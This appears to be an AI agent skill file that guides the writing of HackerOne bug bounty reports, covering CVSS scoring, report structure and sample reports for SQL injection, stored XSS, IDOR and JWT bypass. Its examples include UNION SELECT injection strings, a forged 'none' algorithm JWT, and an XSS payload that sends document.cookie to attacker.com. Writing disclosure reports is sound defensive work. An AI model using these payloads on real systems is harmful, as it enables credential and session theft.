---
name: hackerone-report
description: Generate professional vulnerability reports following HackerOne format with CVSS scoring. Use when a vulnerability has been confirmed and needs formal documentation, when preparing bug bounty submissions, or when the user requests a security report.
tags:
  - security
  - hackerone
  - bug-bounty
  - report
  - cvss
triggers:
  - hackerone report
  - bug bounty report
  - write vulnerability report
  - hackerone submission
---

# hackerone-report

## When to Use

- Vulnerability has been confirmed and needs formal documentation
- User requests a bug bounty report or security report
- Preparing submission for HackerOne or similar platforms
- Need to calculate CVSS severity score for a finding
- Creating professional disclosure documentation
- Documenting proof of concept with impact analysis

## Quick Start

Generate a basic vulnerability report:

```markdown
# [Vulnerability Type] in [Component/Endpoint]

## Summary

[One paragraph describing the vulnerability]

## Severity

**CVSS 3.1 Score:** X.X (Critical/High/Medium/Low)
**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

## Steps to Reproduce

1. Navigate to [URL]
2. Perform [action]
3. Observe [result]

## Impact

[Business and security impact]

## Remediation

[Recommended fix]
```

## Step-by-Step Process

### Step 1: Create Descriptive Title

Format: `[Vulnerability Type] in [Component] at [Location]`

**Good titles:**

```
SQL Injection in User Search at /api/v1/users/search
Stored XSS in Comment Field on Blog Posts
Authentication Bypass via JWT Algorithm Confusion
SSRF to Internal Services via Image Import Feature
IDOR Allows Access to Other Users' Private Documents
```

**Bad titles:**

```
Bug found
Security issue
XSS vulnerability
```

### Step 2: Write Executive Summary

One paragraph covering:

- What the vulnerability is
- Where it exists
- How it can be exploited
- What data or systems are at risk

**Example:**

```markdown
## Summary

A SQL injection vulnerability exists in the user search functionality at
`/api/v1/users/search`. The `query` parameter is concatenated directly into
a SQL statement without sanitization, allowing an attacker to extract
sensitive data from the database including user credentials, personal
information, and payment details. No authentication is required to exploit
this vulnerability.
```

### Step 3: Calculate CVSS 3.1 Score

**Base Metrics:**

| Metric                   | Values                                     | Description                               |
| ------------------------ | ------------------------------------------ | ----------------------------------------- |
| Attack Vector (AV)       | N=Network, A=Adjacent, L=Local, P=Physical | How attacker reaches vulnerable component |
| Attack Complexity (AC)   | L=Low, H=High                              | Conditions beyond attacker's control      |
| Privileges Required (PR) | N=None, L=Low, H=High                      | Auth level needed                         |
| User Interaction (UI)    | N=None, R=Required                         | Victim participation needed               |
| Scope (S)                | U=Unchanged, C=Changed                     | Impact beyond vulnerable component        |
| Confidentiality (C)      | H=High, L=Low, N=None                      | Data exposure impact                      |
| Integrity (I)            | H=High, L=Low, N=None                      | Data modification impact                  |
| Availability (A)         | H=High, L=Low, N=None                      | Service disruption impact                 |

**Severity Ratings:**

| Rating   | Score Range | Examples                                                        |
| -------- | ----------- | --------------------------------------------------------------- |
| Critical | 9.0 - 10.0  | RCE, Pre-auth SQLi with data extraction, Admin account takeover |
| High     | 7.0 - 8.9   | Auth SQLi, Stored XSS with session hijack, Privilege escalation |
| Medium   | 4.0 - 6.9   | Reflected XSS, CSRF, Information disclosure, SSRF (limited)     |
| Low      | 0.1 - 3.9   | Self-XSS, Low-impact info disclosure, Missing security headers  |
| None     | 0.0         | No security impact                                              |

**Common CVSS Vectors by Vulnerability Type:**

```
# Remote Code Execution (Unauthenticated)
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H  # Score: 10.0 Critical

# SQL Injection with Data Extraction
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N  # Score: 9.1 Critical

# SQL Injection (Authenticated)
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N  # Score: 8.1 High

# Stored XSS (Admin Panel)
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N  # Score: 5.4 Medium

# Reflected XSS
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N  # Score: 6.1 Medium

# SSRF to Internal Services
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N  # Score: 5.8 Medium

# SSRF to Cloud Metadata (AWS/GCP)
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N  # Score: 8.6 High

# IDOR (Access Other Users' Data)
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N  # Score: 6.5 Medium

# Authentication Bypass
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N  # Score: 9.1 Critical

# JWT None Algorithm Attack
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N  # Score: 9.1 Critical

# CSRF on Sensitive Action
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N  # Score: 6.5 Medium

# Open Redirect
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N  # Score: 6.1 Medium

# Information Disclosure (Sensitive)
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N  # Score: 5.3 Medium

# Missing Security Headers
CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N  # Score: 3.1 Low
```

### Step 4: Document Steps to Reproduce

Write clear, numbered steps that anyone can follow:

```markdown
## Steps to Reproduce

1. **Navigate to the target endpoint**
```

GET https://target.com/api/v1/users/search?query=test

```

2. **Intercept the request using Burp Suite or browser DevTools**

3. **Modify the query parameter with SQL injection payload**
```

GET https://target.com/api/v1/users/search?query=test' UNION SELECT username,password,email FROM users--

````

4. **Send the modified request**

5. **Observe the response containing extracted data**
```json
{
  "results": [
    {"username": "admin", "password": "hashed_pw", "email": "admin@target.com"}
  ]
}
````

````

**Tips for reproduction steps:**
- Include exact URLs (use `target.com` as placeholder)
- Show complete HTTP requests when relevant
- Include any authentication tokens needed (redacted)
- Specify browser/tool used if relevant
- Add screenshots for visual vulnerabilities

### Step 5: Describe Security Impact

**Impact Framework:**

```markdown
## Impact

### Confidentiality Impact
- [What data can be accessed]
- [Sensitivity of exposed information]
- [Number of affected users/records]

### Integrity Impact
- [What data can be modified]
- [Potential for data corruption]
- [Trust implications]

### Availability Impact
- [Service disruption potential]
- [Resource exhaustion]
- [Denial of service scenarios]

### Business Impact
- [Regulatory compliance (GDPR, PCI-DSS, HIPAA)]
- [Reputational damage]
- [Financial loss potential]
- [Customer trust implications]
````

**Example impact statements:**

```markdown
## Impact

An attacker exploiting this SQL injection vulnerability could:

1. **Extract sensitive user data** including email addresses, password hashes,
   and personal information for all 50,000+ registered users

2. **Access payment information** including credit card tokens and billing
   addresses stored in the database

3. **Escalate privileges** by extracting admin credentials and gaining
   full administrative access to the application

4. **Modify or delete data** potentially causing permanent data loss

This vulnerability poses significant risk under GDPR as it exposes EU citizen
personal data, potentially resulting in regulatory fines up to €20M or 4% of
annual revenue.
```

### Step 6: Provide Proof of Concept

**Include all supporting evidence:**

````markdown
## Proof of Concept

### HTTP Request

```http
POST /api/v1/users/search HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer [REDACTED]

{"query": "admin' UNION SELECT username,password,email FROM users--"}
```
````

### HTTP Response

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "results": [
    {
      "username": "admin",
      "password": "$2b$12$LQv3c1...[REDACTED]",
      "email": "admin@target.com"
    }
  ]
}
```

### Screenshot

[Attach screenshot showing the vulnerability]

### Video (Optional)

[Link to screen recording demonstrating the attack]

````

**PoC guidelines:**
- Redact sensitive data (passwords, tokens, PII)
- Use minimum-impact payloads
- Never access data beyond proving the vulnerability
- Document exact timestamp of testing
- Include all request headers that matter

### Step 7: Suggest Remediation

```markdown
## Remediation

### Immediate Mitigation
- Implement input validation on the `query` parameter
- Deploy WAF rules to block SQL injection patterns

### Long-term Fix
1. **Use parameterized queries** instead of string concatenation:
   ```python
   # Vulnerable
   query = f"SELECT * FROM users WHERE name LIKE '%{user_input}%'"

   # Secure
   cursor.execute("SELECT * FROM users WHERE name LIKE %s", [f"%{user_input}%"])
````

2. **Implement prepared statements** at the database layer

3. **Apply principle of least privilege** for database accounts

4. **Enable query logging** to detect injection attempts

### References

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

````

## Examples

### Example 1: SQL Injection Report (Critical)

```markdown
# SQL Injection in User Search at /api/v1/users/search

## Summary
Critical SQL injection in user search allows complete database compromise.
The `query` parameter is directly concatenated without sanitization.

## Severity
**CVSS 3.1:** 9.1 (Critical) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

## Steps to Reproduce
1. Navigate to `https://target.com/search`
2. Intercept request, modify payload:
   `GET /api/v1/users/search?query=test'+UNION+SELECT+username,password+FROM+users--`
3. Observe database contents in response

## Impact
- Extract all user credentials (50,000+ accounts)
- Access PII and payment data
- GDPR violation exposure

## PoC
Request: `GET /api/v1/users/search?query=test'+UNION+SELECT+*+FROM+users--`
Response: `{"results":[{"username":"admin","password":"$2b$12$[REDACTED]"}]}`

## Remediation
Use parameterized queries: `cursor.execute("SELECT * FROM users WHERE name LIKE %s", [query])`
````

### Example 2: Stored XSS Report (Medium)

```markdown
# Stored XSS in User Profile Bio Field

## Summary

Stored XSS in profile bio executes JavaScript when users view profiles,
enabling session hijacking and account takeover.

## Severity

**CVSS 3.1:** 5.4 (Medium) - CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N

## Steps to Reproduce

1. Log in, navigate to Profile Settings > Edit Bio
2. Enter: `<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">`
3. Save. Have another user view profile - cookies exfiltrated

## Impact

- Session token theft from any viewer
- Account takeover, worm propagation

## PoC

Payload: `<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">`

## Remediation

HTML encode output: `html.escape(user_bio)`, set HttpOnly cookies
```

### Example 3: IDOR Report (Medium)

```markdown
# IDOR Allows Access to Other Users' Documents

## Summary

Document download endpoint lacks authorization, allowing access to any
document by manipulating the ID parameter.

## Severity

**CVSS 3.1:** 6.5 (Medium) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

## Steps to Reproduce

1. As User A, upload document (ID: 12345)
2. As User B, access: `GET /api/v1/documents/12345/download`
3. Successfully download User A's private document

## Impact

- Access all users' confidential documents
- HIPAA/GDPR non-compliance

## PoC

Request as User B: `GET /api/v1/documents/12345/download`
Response: User A's PDF content

## Remediation

Add authorization: `if document.owner_id != current_user.id: raise ForbiddenError`
```

### Example 4: Auth Bypass Report (Critical)

```markdown
# Authentication Bypass via JWT None Algorithm

## Summary

JWT implementation accepts 'none' algorithm, allowing token forgery
for any user including administrators.

## Severity

**CVSS 3.1:** 9.1 (Critical) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

## Steps to Reproduce

1. Create JWT with header: `{"alg": "none", "typ": "JWT"}`
2. Set payload: `{"sub": "admin", "role": "administrator"}`
3. Use token (empty signature): `eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.`
4. Access admin endpoints successfully

## Impact

- Complete authentication bypass
- Full admin access without credentials

## PoC

Forged token: `eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIn0.`

## Remediation

Whitelist algorithms: `jwt.decode(token, key, algorithms=["RS256"])`
```

## Error Handling

| Error                   | Cause                          | Resolution                                        |
| ----------------------- | ------------------------------ | ------------------------------------------------- |
| CVSS score disputed     | Different interpretation       | Reference CVSS calculator, explain metric choices |
| Report marked duplicate | Similar report exists          | Request report ID, verify scope difference        |
| Cannot reproduce        | Environment differences        | Provide exact versions, timestamps, screenshots   |
| Out of scope            | Vulnerability in excluded area | Review program scope, escalate if critical        |
| Informative             | Not security impact            | Explain attack chain, demonstrate real impact     |

## CVSS Calculator Reference

**Online Calculators:**

- FIRST Official: https://www.first.org/cvss/calculator/3.1
- NVD Calculator: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator

**Quick Score Reference:**

| Vulnerability           | Typical CVSS | Rating   |
| ----------------------- | ------------ | -------- |
| RCE (Unauth)            | 9.8-10.0     | Critical |
| SQLi (Unauth, Data)     | 9.1          | Critical |
| Auth Bypass             | 9.1          | Critical |
| SQLi (Auth)             | 8.1          | High     |
| SSRF (Cloud Metadata)   | 8.6          | High     |
| Stored XSS (Privileged) | 8.4          | High     |
| IDOR (Sensitive Data)   | 6.5          | Medium   |
| Reflected XSS           | 6.1          | Medium   |
| CSRF (Sensitive)        | 6.5          | Medium   |
| SSRF (Limited)          | 5.8          | Medium   |
| Open Redirect           | 4.7          | Medium   |
| Info Disclosure         | 5.3          | Medium   |
| Self-XSS                | 3.5          | Low      |
| Missing Headers         | 3.1          | Low      |

## Best Practices

1. **Be professional** - No threats, no demands, factual tone
2. **Be specific** - Exact URLs, parameters, payloads
3. **Be reproducible** - Anyone can follow your steps
4. **Be impactful** - Explain real-world consequences
5. **Be helpful** - Provide remediation guidance
6. **Be patient** - Fixes take time in enterprise environments
7. **Redact sensitive data** - Tokens, passwords, PII
8. **Minimum viable PoC** - Prove impact without excess damage
9. **Document everything** - Timestamps, screenshots, logs
10. **Follow scope** - Stay within program boundaries

## References

- [FIRST CVSS 3.1 Specification](https://www.first.org/cvss/v3.1/specification-document)
- [NVD Vulnerability Metrics](https://nvd.nist.gov/vuln-metrics/cvss)
- [OWASP Vulnerability Disclosure Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)
- [HackerOne Disclosure Guidelines](https://www.hackerone.com/disclosure-guidelines)
- [CWE/CAPEC - Common Weakness Enumeration](https://cwe.mitre.org/)
